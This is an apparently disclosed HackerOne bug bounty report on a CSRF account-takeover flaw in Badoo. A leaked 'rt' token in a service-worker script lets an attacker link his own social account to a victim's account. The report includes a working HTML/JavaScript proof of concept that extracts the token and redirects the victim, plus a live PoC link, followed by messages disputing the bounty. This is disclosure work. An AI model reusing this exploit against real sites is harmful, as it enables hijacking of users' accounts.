title: [CRITICAL] Full account takeover using CSRF
vulnerability_information_html:
Hi , I have found a CSRF issue that allows an attacker to link his gmail , facebook ... or any social account to the victim's account and hijack the whole account.

Details:

When a user tries to link a gmail account with his account , after he authorizes badoo to use his gmail account he will be redirected to https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google> , the only thing that protects from CSRF is the rt parameter which is unique for each user/session . I have noticed that the rt parameter is returned on almost all json responses so I tried to find a link that leaks it. After digging for a while , I have found this link https://eu1.badoo.com/worker-scope/chrome-service-worker.js , and I was surprised that it contains the rt parameter value!!
if you open the link https://eu1.badoo.com/worker-scope/chrome-service-worker.js you'll find a string variable url_stats containing the value of the rt parameter:

var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';

So, now I got a javascript file with the rt param value and I can use it to link any malicious social media account with it.

Here is a PoC:

Here is a live PoC: http://azzazpp.com/badoo.html which will link a dummy gmail account of mine to your badoo account. Go to https://eu1.badoo.com/settings then check your social accounts and you will see a gmail account with the name Mahmoud Gamal added to your social accounts.

<html>
<head>
<title>Badoo account take over</title>
<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function getCSRFcode(str) {
    return str.split('=')[2];
}
window.onload = function(){
var csrf_code = getCSRFcode(url_stats);
csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
window.location = csrf_url;
};
</script>

After an attacker links his gmail , facebook or any social account to the victim's account , he can use it to login to the victim's account and do any modifications he wants.
Please tell me if you are having any problems reproducing this.
Thanks!

activities.message:
The PoC can be used for only one time , if you want to use it again , I will have to change the value of the returned `code` and `session_state` from google.
Thanks.

activities.message:
Hi @iyakovlev , thanks for looking at this. 
The PoC I provided shows how an attacker can hijack a victim's account by linking his malicious gmail account with it. The same PoC can be used to link a facebook , instagram ..etc account with the victim's account. All what the attacker needs is the value of the `rt` param which can be fetched from the javascript file ` https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1` as i explained.

activities.message:
Hi , thanks for the bounty. 
However I am a little disappointed with it :( 
I believe this bug has even more impact than this one https://hackerone.com/reports/121827 , while the other one got a reward of $850 , but mine got only $426!! 

The other report disclosed how an attacker can hijack an account with Facebook , but mine shows how an attacker can hijack it with all available social media account!

Nevertheless , I respect your decision but Can you please have another look regarding it?

activities.message:
Hi @iyakovlev  Thank you very much for the extra bounty. 
I am sorry , but I am curious to know why this isn't category 5 . your program policy says
 > CSRF-vulnerabilities can be very dangerous - the higher the possible damage, the higher the category.

using this bug , it could cause more damage to any user , with it an attacker can modify any user's data and hijack the whole account. I understand that on #121827 you said it didn't get the 5th category because the vector was very simple but my bug is very different than the other and the vector is not simple. The other one allowed hacking through only Facebook , but in this case , all available social accounts are vulnerable. 
I have also noticed that the `rt` parameter is used in some endpoints to prevent CSRF in GET requests , for example in the help Center voting. 
I am sorry but I just thought this could get to 5th category.
Thanks

using this bug , it could cause more damage to any user , with it an attacker can modify any user's data and hijack the whole account. I understand that on #121827 you said it didn't get the 5th category because the vector was very simple but my bug is very different than the other and the vector is not simple. I have also noticed that the rt parameter is used in some endpoints to prevent CSRF in GET requests , for example in the help Center voting.
I am sorry but I just thought this could get to 5th category.
Thanks

activities.message:
Hi @zombiehelp54!
Generally, the fifth category is assigned for finding issues like RCE or SQL injection, or any other vulnerabilities that may cause a huge impact right here and now.
